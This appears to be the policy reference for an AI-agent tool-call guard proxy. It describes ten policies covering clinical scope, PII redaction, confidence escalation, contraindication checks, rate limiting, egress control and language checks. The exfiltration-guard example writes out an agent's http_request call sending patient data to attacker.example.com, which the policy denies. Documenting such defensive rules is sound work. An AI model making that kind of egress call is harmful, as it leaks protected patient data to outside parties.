# DIMAGGI Tool Guard — Policy Reference

This document describes all 10 policies shipped with the Tool Guard demo. Each policy is defined as a YAML file under `policies/` and evaluated by the proxy at runtime.

---

## Clinical Domain

These policies govern AI agents operating in clinical or health-adjacent contexts, where incorrect or out-of-scope tool calls can directly harm patients.

---

### 1. `clinical-scope-lock`

| Field | Value |
|-------|-------|
| **Category** | Clinical |
| **Evaluation path** | Deterministic |
| **Latency** | < 12 ms |
| **Decision** | DENY |

**What it protects against**: An agent drifting outside its designated clinical scope — for example, a medication advisor agent attempting to book appointments, access billing records, or query diagnostic imaging systems it has no mandate to touch.

**Evidence basis**: FDA Digital Health Center of Excellence guidance on Software as a Medical Device (SaMD) requires that AI tools operate only within their validated intended use. EU MDR Article 22 imposes similar scope constraints on AI-driven medical software. The policy YAML cites both.

**Decision + action**: Any tool call whose `tool_name` does not appear in the agent's `allowed_tools` allowlist is immediately blocked with a structured DENY. The agent receives an explanation identifying which tool was disallowed and why.

**Example**:
- Agent type: `medication-advisor`
- Allowed tools: `drug_lookup`, `interaction_check`, `dosage_calculator`
- Tool called: `book_appointment`
- Outcome: `DENY — tool "book_appointment" is not within the permitted scope for agent type medication-advisor`

---

### 2. `pii-boundary`

| Field | Value |
|-------|-------|
| **Category** | Clinical |
| **Evaluation path** | Deterministic |
| **Latency** | < 12 ms |
| **Decision** | REDACT |

**What it protects against**: Leakage of Protected Health Information (PHI) or Personally Identifiable Information (PII) — names, SSNs, date-of-birth combinations, insurance IDs, or free-text that contains identifiers — from tool call responses back to the agent context where it could be logged, cached, or forwarded downstream.

**Evidence basis**: HIPAA 45 CFR §164.514 (Safe Harbor de-identification standard), GDPR Article 9 (special categories of personal data), and NIST SP 800-188 (de-identification of government datasets). `policies/clinical/pii-boundary.yaml` cites all three.

**Decision + action**: The tool call is allowed to proceed, but the response is scrubbed before the agent sees it. Fields matching PII patterns (regex + structural heuristics) are replaced with `[REDACTED]`. The audit record captures which fields were redacted and the original field count.

**Example**:
- Tool response includes: `{"patient_name": "Jane Doe", "ssn": "123-45-6789", "diagnosis": "T2D"}`
- Redacted response to agent: `{"patient_name": "[REDACTED]", "ssn": "[REDACTED]", "diagnosis": "T2D"}`
- Audit record: `decision=REDACT, redacted_fields=["patient_name","ssn"]`

---

### 3. `confidence-gate`

| Field | Value |
|-------|-------|
| **Category** | Clinical |
| **Evaluation path** | Deterministic |
| **Latency** | < 12 ms |
| **Decision** | ESCALATE |

**What it protects against**: An AI agent acting on a tool call result when the underlying model's confidence score falls below a safe threshold. In clinical contexts a low-confidence recommendation that is silently forwarded to the next step of a care workflow can cause harm.

**Evidence basis**: WHO Ethics and Governance of AI for Health (2021) recommends that AI systems communicate uncertainty and defer to humans when confidence is insufficient. The FDA's AI/ML action plan (2021) echoes this for adaptive algorithms.

**Decision + action**: If the tool response includes a `confidence` field (or the proxy infers confidence from log-probability metadata) below the configured threshold (default 0.75), the call is flagged as ESCALATE. Execution is paused and the record is queued for human review before the agent is allowed to proceed.

**Example**:
- Tool: `differential_diagnosis`
- Response: `{"diagnosis": "Pulmonary embolism", "confidence": 0.61}`
- Threshold: 0.75
- Outcome: `ESCALATE — confidence 0.61 is below the required threshold of 0.75 for tool differential_diagnosis`

---

### 4. `contraindication-check`

| Field | Value |
|-------|-------|
| **Category** | Clinical |
| **Evaluation path** | Hybrid (Gemma 4 E4B) |
| **Latency** | < 800 ms |
| **Decision** | DENY |

**What it protects against**: A medication or treatment recommendation that contradicts the patient's known conditions, allergies, or concurrent medications — a class of error that causes approximately 1.3 million injuries per year in the US alone (FDA adverse event reporting, 2023).

**Evidence basis**: AMA clinical decision support guidelines, FDA drug labeling requirements (21 CFR §201.57), and the OpenMRS contraindication alerting specification. The Gemma 4 E4B model is prompted to reason over the patient context and the proposed drug/treatment to identify contraindications that rule-based systems miss.

**Decision + action**: The proxy builds a structured prompt from the tool call arguments (drug name, dose, patient medication list, allergy list) and sends it to Gemma 4 E4B running locally via Ollama. If Gemma identifies a contraindication, the system blocks the call with a DENY that includes the model's natural-language explanation.

**Example**:
- Tool: `prescribe_medication`
- Arguments: `{"drug": "ibuprofen", "patient_allergies": ["NSAIDs"], "dose": "400mg"}`
- Gemma 4 reasoning: "Ibuprofen is an NSAID. The patient has a documented NSAID allergy. Prescribing ibuprofen is contraindicated."
- Outcome: `DENY — contraindication detected: ibuprofen (NSAID) conflicts with documented NSAID allergy`

---

## Security Domain

These policies protect against adversarial misuse of AI agents: exfiltration, rate abuse, and prompt injection patterns that exploit tool call surfaces.

---

### 5. `rate-governor`

| Field | Value |
|-------|-------|
| **Category** | Security |
| **Evaluation path** | Deterministic |
| **Latency** | < 5 ms |
| **Decision** | DENY |

**What it protects against**: Runaway agents or adversarial loops that issue tool calls at rates far exceeding normal usage, causing cost overruns, API quota exhaustion, or DDoS-like pressure on downstream systems.

**Evidence basis**: OWASP LLM Top 10 (LLM04 — Model Denial of Service), NIST AI RMF GOVERN 1.2 (resource consumption controls). Sliding window rate limiting is the industry-standard mitigation.

**Decision + action**: A per-agent sliding window counter tracks tool call frequency. If calls exceed the configured rate (default: 60 calls per 60-second window), subsequent calls are immediately blocked with DENY until the window resets. No Gemma evaluation is needed — the decision is purely numeric.

**Example**:
- Agent: `document-summarizer`
- Calls in last 60 s: 61
- Limit: 60
- Outcome: `DENY — rate limit exceeded: 61 calls in 60 s (limit: 60). Retry after 2026-05-11T14:32:00Z`

---

### 6. `exfiltration-guard`

| Field | Value |
|-------|-------|
| **Category** | Security |
| **Evaluation path** | Deterministic |
| **Latency** | < 12 ms |
| **Decision** | DENY |

**What it protects against**: An agent (or a prompt-injected agent) attempting to call external network tools to send data outside the permitted egress boundary — a common vector for data exfiltration in compromised multi-agent pipelines.

**Evidence basis**: OWASP LLM Top 10 (LLM02 — Insecure Output Handling, LLM08 — Excessive Agency), MITRE ATLAS ML07 (exfiltration via model output). The policy matches against a configurable allowlist of permitted external destinations.

**Decision + action**: Tool calls to `http_request`, `fetch_url`, `send_email`, `upload_file`, or similar egress tools are inspected. The destination (URL, hostname, email domain) is matched against the operator-defined allowlist. Any destination not on the list is blocked with DENY.

**Example**:
- Tool: `http_request`
- Arguments: `{"url": "https://attacker.example.com/exfil", "body": "patient_data"}`
- Allowlist: `["api.internal.hospital.org", "fhir.hl7.org"]`
- Outcome: `DENY — destination "attacker.example.com" is not in the permitted egress allowlist`

---

## Lingua Domain

These policies enforce language-level safety for multilingual AI deployments, ensuring responses reach users in the correct language, script, register, and reading level.

---

### 7. `lingua-language-match`

| Field | Value |
|-------|-------|
| **Category** | Lingua |
| **Evaluation path** | Deterministic |
| **Latency** | < 8 ms |
| **Decision** | FLAG |

**What it protects against**: An agent responding in a different language than the user's session language — a failure mode that causes confusion, excludes non-English speakers, and undermines the premise of multilingual deployment.

**Evidence basis**: The EU Accessibility Act (Directive 2019/882) requires digital services to be accessible in users' preferred languages. W3C Web Content Accessibility Guidelines (WCAG 2.2, Success Criterion 3.1.1) mandates that the language of a page or component can be programmatically determined.

**Decision + action**: The proxy extracts the language tag from the session context and applies fast n-gram language detection to the tool call response text. If the detected language differs from the session language, the call is flagged with FLAG and a warning is appended to the agent's context.

**Example**:
- Session language: `es` (Spanish)
- Tool response: "The patient should take two tablets daily." (English)
- Detected language: `en`
- Outcome: `FLAG — response language "en" does not match session language "es"`

---

### 8. `lingua-script-guard`

| Field | Value |
|-------|-------|
| **Category** | Lingua |
| **Evaluation path** | Deterministic |
| **Latency** | < 5 ms |
| **Decision** | DENY |

**What it protects against**: A response containing text in an unexpected Unicode script — for example, Arabic script appearing in a session configured for Latin-script Spanish, which could indicate a prompt injection that switched the agent's output encoding or a misconfigured translation pipeline.

**Evidence basis**: Unicode Technical Report #36 (Unicode Security Considerations) identifies mixed-script homograph attacks and script confusion as vectors for deception. ISO/IEC 10646 script boundaries are used to define permitted script sets per session.

**Decision + action**: Unicode block analysis classifies every character in the response by its script. If characters from a script outside the session's permitted set exceed a configurable threshold (default 5% of total characters), the call is blocked with DENY.

**Example**:
- Session permitted scripts: `Latin`
- Tool response: "El paciente debe tomar..." followed by 40 Arabic characters injected via prompt
- Arabic character ratio: 12%
- Outcome: `DENY — unexpected script "Arabic" detected (12% of characters, threshold: 5%)`

---

### 9. `lingua-terminology-lock`

| Field | Value |
|-------|-------|
| **Category** | Lingua |
| **Evaluation path** | Hybrid (Gemma 4 E4B) |
| **Latency** | < 800 ms |
| **Decision** | FLAG |

**What it protects against**: A tool response that uses incorrect, informal, or non-standard terminology for the domain — for example, a medical agent using lay terms instead of ICD-10 clinical terminology, or a legal agent using colloquialisms instead of jurisdiction-specific legal language.

**Evidence basis**: ISO 704 (Terminology work — Principles and methods) and the HL7 FHIR Terminology Service specification (for clinical deployments) require consistent use of controlled vocabularies. Gemma 4 E4B is prompted with the domain's approved term list to detect deviations.

**Decision + action**: Gemma 4 E4B is given the tool response and the domain's approved terminology list. The model identifies terms in the response that deviate from the approved vocabulary and returns a list of substitutions. The call is allowed but flagged with FLAG, and the substitution suggestions are attached to the audit record.

**Example**:
- Domain: clinical-es (Spanish clinical)
- Approved term: `hipertensión arterial`
- Response uses: `presión alta` (lay term)
- Outcome: `FLAG — non-standard terminology detected: "presión alta" should be "hipertensión arterial" per HL7 FHIR Spanish clinical vocabulary`

---

### 10. `lingua-reading-level`

| Field | Value |
|-------|-------|
| **Category** | Lingua |
| **Evaluation path** | Hybrid (Gemma 4 E4B) |
| **Latency** | < 800 ms |
| **Decision** | FLAG |

**What it protects against**: Tool responses that are written at a reading level mismatched to the target audience, such as overly technical responses for patients or oversimplified responses in professional contexts. In health literacy contexts, text written above a Grade 6 level has been shown to reduce patient comprehension and medication adherence.

**Evidence basis**: US Department of Health and Human Services Plain Language guidelines (Health Literacy), NIH National Institute on Aging recommendations (reading level ≤ Grade 8 for patient-facing health content), and AMA guidelines on health literacy. The WHO health equity framework is also cited for non-English deployments.

**Decision + action**: Gemma 4 E4B evaluates the response text and estimates the reading level on the Flesch-Kincaid scale (or language-appropriate equivalent for non-Latin scripts). If the estimated level exceeds the session's configured maximum (default: Grade 8 for patient-facing, Grade 16 for professional), the call is flagged with FLAG and a simplified alternative is suggested.

**Example**:
- Session profile: `patient-facing`, max reading level: Grade 8
- Tool response: "Administer 500 mg acetaminophen orally every 4–6 hours PRN for analgesia; do not exceed 4 g/24 h."
- Estimated reading level: Grade 14
- Outcome: `FLAG — reading level Grade 14 exceeds maximum Grade 8 for patient-facing context. Suggested rewrite: "Take 500 mg of Tylenol by mouth every 4–6 hours when you have pain. Do not take more than 4 grams (8 tablets) in one day."`
